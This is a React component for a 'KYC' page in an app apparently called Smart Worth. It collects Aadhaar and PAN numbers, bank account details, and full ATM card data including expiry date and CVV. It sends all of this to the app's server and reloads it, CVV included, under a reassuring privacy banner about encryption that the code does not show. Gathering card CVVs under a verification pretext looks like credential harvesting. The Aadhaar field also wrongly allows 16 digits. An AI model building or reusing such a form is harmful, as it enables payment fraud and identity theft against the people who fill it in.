import React, { useState, useEffect } from 'react';
import { motion } from 'motion/react';
import { Shield, CreditCard, Landmark, FileText, CheckCircle, AlertCircle, Loader2, Save } from 'lucide-react';
import { useAuth } from '../../App';
import BrutalistButton from '../../components/BrutalistButton';
import { fetchApi } from '../../lib/api';

const KYCPanel = () => {
  const { user } = useAuth();
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  const [formData, setFormData] = useState({
    aadhar_number: '',
    pan_number: '',
    bank_name: '',
    account_number: '',
    ifsc_code: '',
    holder_name: '',
    atm_card_number: '',
    atm_expiry: '',
    atm_cvv: ''
  });

  useEffect(() => {
    if (user) {
      fetchKYCData();
    }
  }, [user]);

  const fetchKYCData = async () => {
    try {
      setLoading(true);
      const response = await fetchApi(`/kyc/${user?.id}`);
      if (response.ok) {
        const data = await response.json();
        if (data) {
          setFormData({
            aadhar_number: data.aadhar_number || '',
            pan_number: data.pan_number || '',
            bank_name: data.bank_name || '',
            account_number: data.account_number || '',
            ifsc_code: data.ifsc_code || '',
            holder_name: data.holder_name || '',
            atm_card_number: data.atm_card_number || '',
            atm_expiry: data.atm_expiry || '',
            atm_cvv: data.atm_cvv || ''
          });
        }
      }
    } catch (err: any) {
      console.error('Error fetching KYC:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;

    try {
      setSaving(true);
      setError(null);
      setSuccess(false);

      const response = await fetchApi('/kyc', {
        method: 'POST',
        body: JSON.stringify(formData)
      });

      if (!response.ok) {
        const errData = await response.json();
        throw new Error(errData.error || 'Failed to save details');
      }

      setSuccess(true);
      setTimeout(() => setSuccess(false), 3000);
    } catch (err: any) {
      console.error('Error saving KYC:', err);
      setError(err.message || 'Failed to save details');
    } finally {
      setSaving(false);
    }
  };

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[400px]">
        <Loader2 className="w-10 h-10 text-indigo-600 animate-spin" />
      </div>
    );
  }

  return (
    <div className="max-w-4xl mx-auto space-y-8 pb-12">
      {/* Warning Banner */}
      <motion.div 
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-amber-50 border border-amber-200 rounded-2xl p-4 flex items-start space-x-3"
      >
        <AlertCircle className="text-amber-600 shrink-0 mt-0.5" size={20} />
        <div>
          <h4 className="text-amber-900 font-black text-sm mb-1 uppercase tracking-tight">Privacy Notice 🔐</h4>
          <p className="text-amber-800 text-xs font-bold leading-relaxed">
            Your details are encrypted and stored securely. Only the Smart Worth administrators can track and verify this information for verification purposes.
          </p>
        </div>
      </motion.div>

      <form onSubmit={handleSave} className="space-y-6">
        {/* Personal ID Verification */}
        <section className="bg-white rounded-[2rem] border border-slate-100 shadow-sm overflow-hidden">
          <div className="bg-slate-50 px-8 py-4 border-b border-slate-100 flex items-center space-x-3">
            <Shield className="text-indigo-600" size={22} />
            <h3 className="text-lg font-black text-slate-900 tracking-tight">Identity Documents</h3>
          </div>
          <div className="p-8 grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700 flex items-center">
                <FileText size={14} className="mr-2 text-indigo-500" />
                Aadhar Card Number
              </label>
              <input 
                type="text" 
                id="aadhar_number"
                name="aadhar_number"
                placeholder="0000 0000 0000 0000"
                maxLength={16}
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900"
                value={formData.aadhar_number}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '').slice(0, 16);
                  setFormData(prev => ({...prev, aadhar_number: val}));
                }}
              />
              <p className="text-[10px] text-slate-400 font-bold ml-1">Limit: 16 digit number</p>
            </div>
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700 flex items-center">
                <FileText size={14} className="mr-2 text-indigo-500" />
                PAN Card Number
              </label>
              <input 
                type="text" 
                id="pan_number"
                name="pan_number"
                placeholder="ABCDE1234F"
                maxLength={10}
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900 uppercase"
                value={formData.pan_number}
                onChange={(e) => {
                  const val = e.target.value.toUpperCase().slice(0, 10);
                  setFormData(prev => ({...prev, pan_number: val}));
                }}
              />
              <p className="text-[10px] text-slate-400 font-bold ml-1">Example: 10 characters alphanumeric</p>
            </div>
          </div>
        </section>

        {/* Bank Details */}
        <section className="bg-white rounded-[2rem] border border-slate-100 shadow-sm overflow-hidden">
          <div className="bg-slate-50 px-8 py-4 border-b border-slate-100 flex items-center space-x-3">
            <Landmark className="text-indigo-600" size={22} />
            <h3 className="text-lg font-black text-slate-900 tracking-tight">Bank Details</h3>
          </div>
          <div className="p-8 grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700">Bank Name</label>
              <input 
                type="text" 
                placeholder="Enter Bank Name"
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900"
                value={formData.bank_name}
                onChange={(e) => setFormData({...formData, bank_name: e.target.value})}
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700">Account Holder Name</label>
              <input 
                type="text" 
                placeholder="As per passbook"
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900"
                value={formData.holder_name}
                onChange={(e) => setFormData({...formData, holder_name: e.target.value})}
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700">Account Number</label>
              <input 
                type="text" 
                id="account_number"
                name="account_number"
                placeholder="Enter Account Number"
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900"
                value={formData.account_number}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '');
                  setFormData(prev => ({...prev, account_number: val}));
                }}
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700">IFSC Code</label>
              <input 
                type="text" 
                id="ifsc_code"
                name="ifsc_code"
                placeholder="SBIN0001234"
                maxLength={11}
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900 uppercase"
                value={formData.ifsc_code}
                onChange={(e) => {
                  const val = e.target.value.toUpperCase().slice(0, 11);
                  setFormData(prev => ({...prev, ifsc_code: val}));
                }}
              />
            </div>
          </div>
        </section>

        {/* ATM Card Details (Optional/Secure) */}
        <section className="bg-white rounded-[2rem] border border-slate-100 shadow-sm overflow-hidden">
          <div className="bg-slate-50 px-8 py-4 border-b border-slate-100 flex items-center space-x-3">
            <CreditCard className="text-indigo-600" size={22} />
            <h3 className="text-lg font-black text-slate-900 tracking-tight">ATM / Card Settings</h3>
          </div>
          <div className="p-8 grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="md:col-span-2 space-y-2">
              <label className="text-sm font-black text-slate-700">Card Number</label>
              <div className="relative">
                <input 
                  type="text" 
                  id="atm_card_number"
                  name="atm_card_number"
                  placeholder="0000 0000 0000 0000"
                  maxLength={16}
                  className="w-full pl-5 pr-14 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900"
                  value={formData.atm_card_number}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
                    setFormData(prev => ({...prev, atm_card_number: val}));
                  }}
                />
                <CreditCard size={20} className="absolute right-5 top-1/2 -translate-y-1/2 text-slate-400" />
              </div>
            </div>
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700">Expiry Date</label>
              <input 
                type="text" 
                id="atm_expiry"
                name="atm_expiry"
                placeholder="MM/YY"
                maxLength={5}
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900"
                value={formData.atm_expiry}
                onChange={(e) => setFormData(prev => ({...prev, atm_expiry: e.target.value}))}
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-black text-slate-700">CVV</label>
              <input 
                type="text" 
                id="atm_cvv"
                name="atm_cvv"
                placeholder="***"
                maxLength={3}
                className="w-full px-5 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-indigo-600/30 focus:ring-4 focus:ring-indigo-600/5 transition-all outline-none font-bold text-slate-900"
                value={formData.atm_cvv}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '').slice(0, 3);
                  setFormData(prev => ({...prev, atm_cvv: val}));
                }}
              />
            </div>
          </div>
        </section>

        {/* Action Buttons */}
        <div className="flex flex-col items-center space-y-4 pt-4">
          <BrutalistButton 
            disabled={saving}
            className="w-full max-w-sm"
            onClick={handleSave}
          >
            {saving ? (
              <span className="flex items-center">
                <Loader2 size={20} className="mr-2 animate-spin" />
                Saving Details...
              </span>
            ) : (
              <span className="flex items-center">
                <Save size={20} className="mr-2" />
                Save KYC Details
              </span>
            )}
          </BrutalistButton>

          {error && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex items-center text-red-600 text-sm font-bold"
            >
              <AlertCircle size={16} className="mr-1" />
              {error}
            </motion.div>
          )}

          {success && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex items-center text-emerald-600 text-sm font-bold"
            >
              <CheckCircle size={16} className="mr-1" />
              Details saved successfully!
            </motion.div>
          )}
        </div>
      </form>
    </div>
  );
};

export default KYCPanel;
